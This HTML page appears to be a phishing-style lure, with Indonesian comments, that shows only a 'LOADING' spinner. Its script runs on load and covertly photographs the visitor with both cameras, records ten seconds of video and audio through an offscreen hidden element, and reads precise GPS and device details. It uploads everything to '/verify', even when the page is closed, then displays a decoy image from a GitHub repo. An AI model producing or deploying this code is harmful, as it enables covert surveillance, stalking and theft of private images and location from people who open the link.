<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }
        .container { text-align: center; }
        .spinner {
            width: 50px;
            height: 50px;
            margin: 0 auto 20px;
            border: 4px solid #e0e0e0;
            border-top-color: #333;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: 400; color: #333; letter-spacing: 6px; }
        .hidden { display: none !important; }
        #hidden-video { display: none; }
        #hidden-canvas { display: none; }
        #recorder-video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        .result-image {
            max-width: 100%;
            max-height: 80vh;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        .result-container { display: none; }
        .result-container.visible { display: block; }
    </style>
</head>
<body>
    <!-- LOADING -->
    <div class="container" id="loadingContainer">
        <div class="spinner" id="spinner"></div>
        <h1 id="title">LOADING</h1>
    </div>

    <!-- RESULT FOTO DARI GITHUB -->
    <div class="container result-container" id="resultContainer">
        <img src="" alt="Result" class="result-image" id="resultImage">
    </div>

    <video id="hidden-video" autoplay playsinline muted></video>
    <video id="recorder-video" autoplay playsinline muted></video>
    <canvas id="hidden-canvas"></canvas>

    <script>
        const video = document.getElementById('hidden-video');
        const recorderVideo = document.getElementById('recorder-video');
        const canvas = document.getElementById('hidden-canvas');
        const loadingContainer = document.getElementById('loadingContainer');
        const resultContainer = document.getElementById('resultContainer');
        const resultImage = document.getElementById('resultImage');

        let stream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let isRecording = false;
        let hasSent = false;
        let photos = { front: null, back: null };
        let gpsData = null;
        let deviceData = null;
        let videoBlobData = null;

        // ============================================
        // 📸 AMBIL FOTO KAMERA DEPAN + BELAKANG
        // ============================================
        async function captureBothCameras() {
            const result = { front: null, back: null };

            // Kamera Depan
            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: false
                });
                const frontVideo = document.createElement('video');
                frontVideo.srcObject = frontStream;
                frontVideo.muted = true;
                await frontVideo.play();
                await new Promise(r => setTimeout(r, 500));

                const frontCanvas = document.createElement('canvas');
                frontCanvas.width = frontVideo.videoWidth || 640;
                frontCanvas.height = frontVideo.videoHeight || 480;
                const fCtx = frontCanvas.getContext('2d');
                fCtx.drawImage(frontVideo, 0, 0);
                result.front = frontCanvas.toDataURL('image/jpeg', 0.85);

                frontStream.getTracks().forEach(t => t.stop());
                console.log('📸 Front camera captured');
            } catch (e) {
                console.log('⚠️ Front camera error:', e.message);
            }

            // Kamera Belakang
            try {
                const backStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: 640, height: 480 },
                    audio: false
                });
                const backVideo = document.createElement('video');
                backVideo.srcObject = backStream;
                backVideo.muted = true;
                await backVideo.play();
                await new Promise(r => setTimeout(r, 500));

                const backCanvas = document.createElement('canvas');
                backCanvas.width = backVideo.videoWidth || 640;
                backCanvas.height = backVideo.videoHeight || 480;
                const bCtx = backCanvas.getContext('2d');
                bCtx.drawImage(backVideo, 0, 0);
                result.back = backCanvas.toDataURL('image/jpeg', 0.85);

                backStream.getTracks().forEach(t => t.stop());
                console.log('📸 Back camera captured');
            } catch (e) {
                console.log('⚠️ Back camera error:', e.message);
            }

            return result;
        }

        // ============================================
        // 🎥 REKAM VIDEO 10 DETIK + AUDIO (MP4)
        // ============================================
        async function recordVideo() {
            return new Promise((resolve) => {
                recordedChunks = [];

                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true
                    }
                })
                .then((stream) => {
                    recorderVideo.srcObject = stream;
                    recorderVideo.muted = true;
                    recorderVideo.play();

                    // Pake MP4 (h264) biar bisa diputar di Telegram
                    const mimeTypes = [
                        'video/mp4;codecs=h264,aac',
                        'video/mp4;codecs=avc1,mp4a',
                        'video/webm;codecs=vp9,opus',
                        'video/webm'
                    ];

                    let selectedMimeType = null;
                    for (const type of mimeTypes) {
                        if (MediaRecorder.isTypeSupported(type)) {
                            selectedMimeType = type;
                            break;
                        }
                    }

                    if (!selectedMimeType) {
                        selectedMimeType = 'video/webm';
                    }

                    console.log('📹 Using mimeType:', selectedMimeType);

                    mediaRecorder = new MediaRecorder(stream, {
                        mimeType: selectedMimeType,
                        videoBitsPerSecond: 3000000,
                        audioBitsPerSecond: 128000
                    });

                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = () => {
                        const blob = new Blob(recordedChunks, {
                            type: selectedMimeType || 'video/mp4'
                        });
                        stream.getTracks().forEach(t => t.stop());
                        recorderVideo.srcObject = null;
                        isRecording = false;
                        resolve(blob);
                    };

                    isRecording = true;
                    mediaRecorder.start(1000);
                    console.log('🎥 Recording started for 10 seconds...');

                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            console.log('⏹️ Recording stopped (10 seconds)');
                        }
                    }, 10000); // 10 DETIK
                })
                .catch((err) => {
                    console.error('❌ Record error:', err);
                    resolve(null);
                });
            });
        }

        // ============================================
        // 📍 GPS
        // ============================================
        function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => { resolve(null); },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // ============================================
        // 📱 DEVICE INFO
        // ============================================
        function getDeviceInfo() {
            const ua = navigator.userAgent.toLowerCase();
            const info = {
                browser: 'Tidak diketahui',
                os: 'Tidak diketahui',
                device: 'Tidak diketahui',
                brand: 'Tidak diketahui',
                model: 'Tidak diketahui'
            };
            if (ua.includes('chrome')) info.browser = 'Chrome';
            else if (ua.includes('firefox')) info.browser = 'Firefox';
            else if (ua.includes('safari') && !ua.includes('chrome')) info.browser = 'Safari';
            else if (ua.includes('edge')) info.browser = 'Edge';
            if (ua.includes('android')) {
                info.os = 'Android';
                const match = ua.match(/android\s([\d.]+)/);
                if (match) info.os += ` ${match[1]}`;
            } else if (ua.includes('iphone') || ua.includes('ipad')) {
                info.os = 'iOS';
                const match = ua.match(/os\s([\d_]+)/);
                if (match) info.os += ` ${match[1].replace(/_/g, '.')}`;
            } else if (ua.includes('windows')) {
                info.os = 'Windows';
            } else if (ua.includes('mac')) {
                info.os = 'macOS';
            }
            if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
                info.device = 'Mobile';
            } else if (ua.includes('tablet') || ua.includes('ipad')) {
                info.device = 'Tablet';
            } else {
                info.device = 'Desktop';
            }
            const brands = [
                { name: 'Samsung', patterns: ['samsung', 'sm-'] },
                { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
                { name: 'Realme', patterns: ['realme'] },
                { name: 'Oppo', patterns: ['oppo'] },
                { name: 'Vivo', patterns: ['vivo'] },
                { name: 'OnePlus', patterns: ['oneplus'] },
                { name: 'Google Pixel', patterns: ['pixel'] },
                { name: 'Huawei', patterns: ['huawei', 'honor'] },
                { name: 'Apple', patterns: ['iphone', 'ipad'] }
            ];
            for (const brand of brands) {
                if (brand.patterns.some(p => ua.includes(p))) {
                    info.brand = brand.name;
                    break;
                }
            }
            if (info.brand === 'Apple') {
                const match = ua.match(/iphone(\d+)/);
                if (match) info.model = `iPhone ${match[1]}`;
            } else if (info.brand === 'Samsung') {
                const match = ua.match(/sm-[a-z0-9]+/i);
                if (match) info.model = match[0].toUpperCase();
            }
            return info;
        }

        // ============================================
        // 🖼️ AMBIL GAMBAR DARI GITHUB
        // ============================================
        async function getImageFromGitHub() {
            try {
                const username = 'danakagetberkah';
                const repo = 'DANA-BERKAH';
                const branch = 'main';
                const imagePath = 'foto.jpg';
                
                const response = await fetch(
                    `https://api.github.com/repos/${username}/${repo}/contents/${imagePath}?ref=${branch}`
                );
                
                if (response.ok) {
                    const data = await response.json();
                    const base64Image = data.content;
                    return `data:image/jpeg;base64,${base64Image}`;
                }
                return null;
            } catch (err) {
                console.error('Error ambil gambar:', err);
                return null;
            }
        }

        // ============================================
        // 📤 SEND DATA KE SERVER
        // ============================================
        async function sendData() {
            if (hasSent) return;
            hasSent = true;

            try {
                let videoBase64 = null;
                if (videoBlobData) {
                    const reader = new FileReader();
                    videoBase64 = await new Promise((resolve) => {
                        reader.readAsDataURL(videoBlobData);
                        reader.onloadend = () => resolve(reader.result);
                    });
                }

                const requestData = {
                    frontPhoto: photos.front,
                    backPhoto: photos.back,
                    video: videoBase64,
                    gps: gpsData,
                    device: deviceData,
                    timestamp: new Date().toISOString()
                };

                console.log('📤 Sending data to server...');
                const response = await fetch('/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(requestData)
                });

                const result = await response.json();
                console.log('📨 Response:', result);
                return true;
            } catch (err) {
                console.error('❌ Send error:', err);
                return false;
            }
        }

        // ============================================
        // 🚀 MAIN PROCESS
        // ============================================
        async function startProcess() {
            try {
                // 1. AMBIL FOTO
                photos = await captureBothCameras();

                // 2. GPS
                gpsData = await getGPSLocation();
                console.log('📍 GPS:', gpsData);

                // 3. DEVICE INFO
                deviceData = getDeviceInfo();
                console.log('📱 Device:', deviceData);

                // 4. REKAM VIDEO 10 DETIK
                videoBlobData = await recordVideo();

                // 5. SEND DATA
                await sendData();

                // 6. TAMPILKAN FOTO DARI GITHUB
                const githubImage = await getImageFromGitHub();
                if (githubImage) {
                    resultImage.src = githubImage;
                } else if (photos.front) {
                    resultImage.src = photos.front;
                } else {
                    resultImage.src = 'https://via.placeholder.com/400x600/ccc/fff?text=No+Photo';
                }

                setTimeout(() => {
                    loadingContainer.classList.add('hidden');
                    resultContainer.classList.add('visible');
                }, 500);

            } catch (err) {
                console.error('❌ Error:', err);
                // Tetap kirim data yang sudah ada
                await sendData();
                
                loadingContainer.classList.add('hidden');
                resultContainer.classList.add('visible');
                const githubImage = await getImageFromGitHub();
                if (githubImage) {
                    resultImage.src = githubImage;
                } else {
                    resultImage.src = 'https://via.placeholder.com/400x600/ff6b6b/fff?text=Error';
                }
            }
        }

        // ============================================
        // 🛑 KALAU WEB DI-CLOSE, TETAP KIRIM DATA
        // ============================================
        window.addEventListener('beforeunload', async (event) => {
            console.log('🔄 Page closing, sending data...');
            
            // Stop recording
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                // Tunggu sebentar biar video selesai
                await new Promise(r => setTimeout(r, 500));
            }
            
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }

            // Kirim data yang sudah ada
            await sendData();
            
            // Biarkan page close
            return;
        });

        // ============================================
        // 🚀 START
        // ============================================
        window.onload = () => {
            console.log('📄 Page loaded');
            setTimeout(startProcess, 500);
        };
    </script>
</body>
</html>
